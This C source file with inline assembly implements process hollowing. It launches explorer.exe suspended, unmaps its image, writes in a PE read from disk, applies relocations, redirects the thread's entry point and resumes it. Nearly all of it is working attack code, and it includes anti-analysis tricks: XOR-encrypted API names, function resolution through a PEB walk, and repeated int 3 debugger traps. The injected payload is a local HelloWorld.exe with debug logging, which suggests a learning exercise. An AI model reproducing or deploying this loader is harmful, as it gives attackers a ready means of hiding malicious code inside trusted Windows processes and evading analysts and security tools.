#include <windows.h>
#include <stdio.h>
#include <subauth.h>
#include "Hollow.h"
#include "Exception.h"

#define DEBUG


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA {
	BYTE       Reserved1[8];
	PVOID      Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;



typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PPEB_LDR_DATA                 Ldr;
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	struct PS_POST_PROCESS_INIT_ROUTINE*  PostProcessInitRoutine;
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} PEB, * PPEB;


typedef struct _smPROCESS_BASIC_INFORMATION {
	LONG ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef  BOOL(__stdcall *_CreateProcessA)(LPCSTR,LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL,DWORD , LPVOID , LPCSTR ,LPSTARTUPINFOA ,LPPROCESS_INFORMATION);
typedef  BOOL(__stdcall* _ReadProcessMemory)(HANDLE ,LPCVOID , LPVOID ,SIZE_T ,SIZE_T);
typedef  BOOL(__stdcall* _WriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T);
typedef  HANDLE(__stdcall* _CreateFileA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef  DWORD(__stdcall* _GetFileSize)(HANDLE, LPDWORD);
typedef  PVOID(WINAPI* _RtlAllocateHeap)(HANDLE , DWORD, SIZE_T);
typedef BOOL(__stdcall* _ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED); 
typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(HANDLE , PROCESS_INFORMATION_CLASS,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
typedef HANDLE(* _GetProcessHeap)();
typedef LPVOID(__stdcall* _VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (__stdcall *_GetThreadContext)(HANDLE,LPCONTEXT);
typedef BOOL(__stdcall* _SetThreadContext)(HANDLE,LPCONTEXT);
typedef DWORD (__stdcall * _ResumeThread)(HANDLE);


DWORD kernel32_base, ntdll_base;

/*encrypted strings*/
char StrCreateProcessA[] = { 0xd3,0xe2,0xf5,0xf1,0xe4,0xf5,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xd1,0 };
char StrReadProcessMemory[] = { 0xc2,0xf5,0xf1,0xf4,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xdd,0xf5,0xfd,0xff,0xe2,0xe9,0 };
char StrWriteProcessMemory[] = { 0xc7,0xe2,0xf9,0xe4,0xf5,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xdd,0xf5,0xfd,0xff,0xe2,0xe9,0 };
char StrCreateFileA[] = { 0xd3,0xe2,0xf5,0xf1,0xe4,0xf5,0xd6,0xf9,0xfc,0xf5,0xd1,0 };
char StrGetFileSize[] = { 0xd7,0xf5,0xe4,0xd6,0xf9,0xfc,0xf5,0xc3,0xf9,0xea,0xf5,0 };
char StrRtlAllocateHeap[] = { 0xc2,0xe4,0xfc,0xd1,0xfc,0xfc,0xff,0xf3,0xf1,0xe4,0xf5,0xd8,0xf5,0xf1,0xe0,0 };
char StrReadFile[] = { 0xc2,0xf5,0xf1,0xf4,0xd6,0xf9,0xfc,0xf5,0 };
char StrNtQueryInformationProcess[] = { 0xde,0xe4,0xc1,0xe5,0xf5,0xe2,0xe9,0xd9,0xfe,0xf6,0xff,0xe2,0xfd,0xf1,0xe4,0xf9,0xff,0xfe,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0 };
char StrNtUnmapViewOfSection[] = { 0xde,0xe4,0xc5,0xfe,0xfd,0xf1,0xe0,0xc6,0xf9,0xf5,0xe7,0xdf,0xf6,0xc3,0xf5,0xf3,0xe4,0xf9,0xff,0xfe,0 };
char StrGetProcessHeap[] = { 0xd7,0xf5,0xe4,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xd8,0xf5,0xf1,0xe0,0 };
char StrVirtualAllocEx[] = { 0xc6,0xf9,0xe2,0xe4,0xe5,0xf1,0xfc,0xd1,0xfc,0xfc,0xff,0xf3,0xd5,0xe8,0 };
char StrGetThreadContext[] = { 0xd7,0xf5,0xe4,0xc4,0xf8,0xe2,0xf5,0xf1,0xf4,0xd3,0xff,0xfe,0xe4,0xf5,0xe8,0xe4,0 };
char StrSetThreadContext[] = { 0xc3,0xf5,0xe4,0xc4,0xf8,0xe2,0xf5,0xf1,0xf4,0xd3,0xff,0xfe,0xe4,0xf5,0xe8,0xe4,0 };
char StrResumeThread[] = { 0xc2,0xf5,0xe3,0xe5,0xfd,0xf5,0xc4,0xf8,0xe2,0xf5,0xf1,0xf4,0 };


DWORD GetProcessHeapo()
{
	__asm {
		xor eax , eax
		mov eax , fs:[eax+0x30]
		mov eax , [eax+0x18]
	}
}

void Kernel32_NTdll_bases()
{
	__asm {
		xor eax , eax
		mov eax , fs:[eax + 0x30] //PEB
		mov eax , [eax+0xc] // pointer LDR 
		mov eax , [eax+0x14] // InMemoryOrderModuleList
		mov eax , [eax]	 
		mov ecx , [eax+0x10] // image base of ntdll 
		mov [ntdll_base] , ecx
		mov eax , [eax] // kernel32.dll
		mov ecx , [eax+0x10]
		mov [kernel32_base] , ecx // image base of kernel32.dll
	}

}

DWORD find_function_address(DWORD base , char * function_name)
{ 
	__asm {
		/*decrypt function name*/
		mov edi , function_name
		lopp :
			cmp [edi],0x0
			je resu
			xor [edi] , 0x90
			inc edi
			jnz lopp
		resu :
		/* Virtual addresses to (exported , name , ordinal) tables*/
		mov eax, base
		mov edx, [eax + 0x3c] // RVA PE signature
		add edx, eax // address of PE signature
		mov edx, [edx + 0x78] // RVA of export table  
		/* mov eax , [eax+0x14]  number of exported functions*/
		add edx, eax // address export table
		mov ebx, [edx + 0x1c] // RVA exported functions
		add ebx, eax // EBX  = va of exported functions
		mov esi, [edx + 0x20] // RVA name_pointer_table
		add esi, eax // ESI = va of name_pointer_table
		mov edx, [edx + 0x24] // RVA of ordinal table
		add edx, eax // EDX = va of ordinal table

		/*length function name*/
		push eax /* saving base address on the stack*/
		xor ecx , ecx
		mov edi, function_name
		xor eax, eax
		repp:
		inc ecx
			cmp [edi + ecx], 0
			jz compare_names
			inc ecx
			jmp repp
			/*Function address*/
		
		compare_names:
			cld // Direction flag , process string from left to right
			push esi
			mov esi, [esi + eax * 4]
			add esi, [esp+4]
			push ecx // save value (repe cmpsb change it)
			push edi
			repe cmpsb // is [edi]==[esi] ?
			pop edi
			pop ecx
			pop esi
			jz name_found
			inc eax
			jmp compare_names
		name_found:
			pop esi // base
			mov ax, [edx + eax * 2] // function ordinal
			mov edx , [ebx + eax * 4] // RVA of function
			add edx , esi
		 
		xchg eax , edx
	}
}



inline int wmain()
{
	Kernel32_NTdll_bases();
	PROCESS_BASIC_INFORMATION pbi ; 
	STARTUPINFOA blah;
	PROCESS_INFORMATION blah1; 
	ZeroMemory(&blah, sizeof(blah));
	_CreateProcessA _CreateProc = find_function_address(kernel32_base, StrCreateProcessA);
	__try {
		__asm int 3;
	}__except(EXCEPTION_EXECUTE_HANDLER){}
	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\SysWOW64\\explorer.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
		printf("error creating this trash process bye , %d!\n",GetLastError());
		exit(1); 
	}
	
	HANDLE target = blah1.hProcess;
	ULONG len;
	_NtQueryInformationProcess NtQueryInformationPr= find_function_address(ntdll_base, StrNtQueryInformationProcess);
	NTSTATUS status = NtQueryInformationPr(target, 0, &pbi,sizeof(pbi),&len);
	/*	if (NT_ERROR(status)) {
		printf("NtQuery failed !"); 
	}*/
	DWORD pebImageBaseOffset = (DWORD)pbi.PebBaseAddress + 8; 
	LPVOID TargetImageBase = 0;
	SIZE_T bytesRead = NULL;
	__try {
		__asm int 3;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}
	_ReadProcessMemory ReadProcessMem = find_function_address(kernel32_base, StrReadProcessMemory); 
	ReadProcessMem(target, (LPCVOID)pebImageBaseOffset, &TargetImageBase, 4, &bytesRead);
#ifdef DEBUG
	printf("[+] base address of target 0x%x\n", (DWORD)TargetImageBase); 
#endif
	
	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, StrNtUnmapViewOfSection);
#ifdef DEBUG
	printf("[+] _NtUnmapViewOfSection @ 0x%x\n", (DWORD)NtUnmapViewOfSe);
#endif
	NtUnmapViewOfSe(target,TargetImageBase);
	
	/*source file*/
	_CreateFileA Createfil = find_function_address(kernel32_base,StrCreateFileA);
	__try {
		__asm int 3;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}
	HANDLE src = Createfil("C:\\Users\\Slashroot\\Desktop\\ml\\HelloWorld.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (src==INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		printf("can't open file . bye !"); 
#endif
		return 0xDEADBEEF; 
	}
	
	_GetFileSize GetFilesiz = find_function_address(kernel32_base, StrGetFileSize);
	DWORD srcSize = GetFilesiz(src, NULL);
	LPDWORD BytesRead = 0;
	_RtlAllocateHeap RtlAllocateH = find_function_address(ntdll_base ,StrRtlAllocateHeap);
#ifdef DEBUG
	printf("[+] RtlAllocateHeap address @ 0x%x\n", (DWORD)RtlAllocateH);
#endif
	_GetProcessHeap GetProcessHea = find_function_address(kernel32_base, StrGetProcessHeap);
#ifdef DEBUG
	printf("[+] GetProcessHea address @ 0x%x\n", (DWORD)GetProcessHea);  
#endif
	HANDLE heappi= GetProcessHeapo(); 
#ifdef DEBUG
	printf("[+] address of RtlAllocateHeap = 0x%x\n",(DWORD)RtlAllocateH);
#endif
	LPVOID srcBuffer = RtlAllocateH(heappi, HEAP_ZERO_MEMORY, srcSize);
	_ReadFile ReadFil = find_function_address(kernel32_base, StrReadFile);
	ReadFil(src, srcBuffer, srcSize, NULL, NULL);
	CloseHandle(src);

	__try {
		__asm int 3;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}
	/*copy to target*/
		/*Allocate memory*/

	PIMAGE_DOS_HEADER srcDosHeader = (PIMAGE_DOS_HEADER)srcBuffer; 
	PIMAGE_NT_HEADERS srcNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)srcBuffer + srcDosHeader->e_lfanew); 
	SIZE_T srcImgSize = srcNtHeaders->OptionalHeader.SizeOfImage; 
	
#ifdef DEBUG	
	printf("[+] src image size 0x%x\n" ,srcImgSize); 
#endif

	/* 
	ideally we allocate memory on targetimagebase , but I kept getting ERROR_INVALID_ADDRESS	
	If this address is within an enclave that you have not initialized by calling InitializeEnclave, VirtualAllocEx allocates a page of zeros for the enclave at that address. 
	The page must be previously uncommitted, and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.
	If the address in within an enclave that you initialized, then the allocation operation fails with the ERROR_INVALID_ADDRESS error.
	*/
	/*
	My approach here is to keep trying (kill the create process and recall main), be carefull if this operation gets in an inifinite loop , it will crush the program (since the stack is limited)
	*/
	__try {
		__asm int 3;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}
	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, StrVirtualAllocEx);
#ifdef DEBUG
	printf("[+] targetimagebase is = %x\n",(DWORD)TargetImageBase);
#endif	
	LPVOID DstImgBase= VirtualAll(target, TargetImageBase, srcImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	while (!DstImgBase) {
#ifdef DEBUG
		printf("[+] error allocating trying to repeat operation\n");
#endif
		TerminateProcess(target , 1); 
		wmain(); 
		return 0xDEADBEEF;
	}
	
	
	DWORD Diff =  (DWORD)DstImgBase- srcNtHeaders->OptionalHeader.ImageBase ;
	
#ifdef DEBUG 
	printf("[+] log about Imagebase:\n\tPrefered Source image = 0x%x\n\tMemory on destination allocated at = 0x%x\n\tDifference = 0x%x\n", srcNtHeaders->OptionalHeader.ImageBase, (DWORD)DstImgBase,Diff);
#endif
	srcNtHeaders->OptionalHeader.ImageBase = TargetImageBase;
	/*copying headers*/
	__try {
		__asm int 3;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}
	_WriteProcessMemory WriteProcessMem = find_function_address(kernel32_base,StrWriteProcessMemory);
	WriteProcessMem(target, DstImgBase,srcBuffer, srcNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
	PIMAGE_SECTION_HEADER srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

	/*copying sections*/
	
	BYTE Section; 
	for (Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++, srcImageSection++)
	{
		__try {
			__asm int 3;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {}
		WriteProcessMem(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((BYTE*)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
#ifdef DEBUG
		printf("[+] Writing  Section %s to @0x%x\n",srcImageSection->Name, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress));
#endif
	}
	srcImageSection--; /*saving last section for relocation*/
#ifdef DEBUG
	printf("[+] Sections Copied successfully\n");
#endif
	/* Relocations */
	/* 
	reloc is the last section on the binary statiscly speaking (statement to confirm) , of course theoretically it can be otherwise with some custom compiler options 
	in this implementation I'am assumuing that hypothesis since I have control on the PE that I'll inject .
	*/
	/*
	from the loop before , our section variable points to .reloc section
	*/
	DWORD relocAddress = srcImageSection->PointerToRawData;
	IMAGE_DATA_DIRECTORY relocData = srcNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD offset_block = 0; 
#ifdef DEBUG
	printf("[+] Relocation log : \n\t relocAddress = 0x%x\n",relocAddress);
	Sleep(5000); 
#endif
	 
		while (offset_block < relocData.Size) /*iterating over HeaderBlocks*/
		{
			PBASE_RELOCATION_BLOCK Blockheader = (PBASE_RELOCATION_BLOCK)((DWORD)srcBuffer + relocAddress + offset_block);
			offset_block += sizeof(BASE_RELOCATION_BLOCK);
#ifdef DEBUG
			printf("\n[+] Block size = %x\n", Blockheader->BlockSize);
#endif
			DWORD N_Entries = (Blockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
#ifdef DEBUG
			printf("[+] Number of entries = %x\n", N_Entries);
			//Sleep(500);
#endif
			PBASE_RELOCATION_ENTRY First_Block = (PBASE_RELOCATION_ENTRY)((BYTE*)srcBuffer + relocAddress + offset_block);

			for (DWORD X = 0; X < N_Entries; X++) /*iterating over entries*/
			{

				offset_block += sizeof(BASE_RELOCATION_ENTRY);
				if (First_Block[X].Type)
				{
					__try {
						__asm int 3;
					}
					__except (EXCEPTION_EXECUTE_HANDLER) {}

					DWORD value;
					ReadProcessMem(target, (LPCVOID)((BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset), &value, sizeof(DWORD), NULL);
					value += Diff;
					
#ifdef DEBUG
					printf("\rRelocating Address 0x%x -> 0x%x", value - Diff, value);
					fflush(stdout); 
					Sleep(2);
					
#endif				
					__try {
						__asm int 3;
					}
					__except (EXCEPTION_EXECUTE_HANDLER) {}
					if (!WriteProcessMem(target, (LPCVOID)((BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset), &value, sizeof(DWORD), NULL))
					{
						printf("[-] error error error");
						return 0xDEADBEEF;
					};
					 
				}
			}
		}

		
		CONTEXT ctx ;
		ctx.ContextFlags = CONTEXT_INTEGER;
		__try {
			__asm int 3;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {}
		_GetThreadContext GetThreadCont = find_function_address(kernel32_base, StrGetThreadContext); 
		_SetThreadContext SetThreadCont = find_function_address(kernel32_base, StrSetThreadContext);
		__try {
			__asm int 3;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {}
		_ResumeThread ResumeThrea = find_function_address(kernel32_base, StrResumeThread); 
		GetThreadCont(blah1.hThread, &ctx);
		ctx.Eax = (DWORD)TargetImageBase + srcNtHeaders->OptionalHeader.AddressOfEntryPoint;
#ifdef DEBUG
		printf("\nEntry point Eax = 0x%x",ctx.Eax); 
#endif
		SetThreadCont(blah1.hThread,&ctx);
		__try {
			__asm int 3;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {}
		ResumeThrea(blah1.hThread);
}
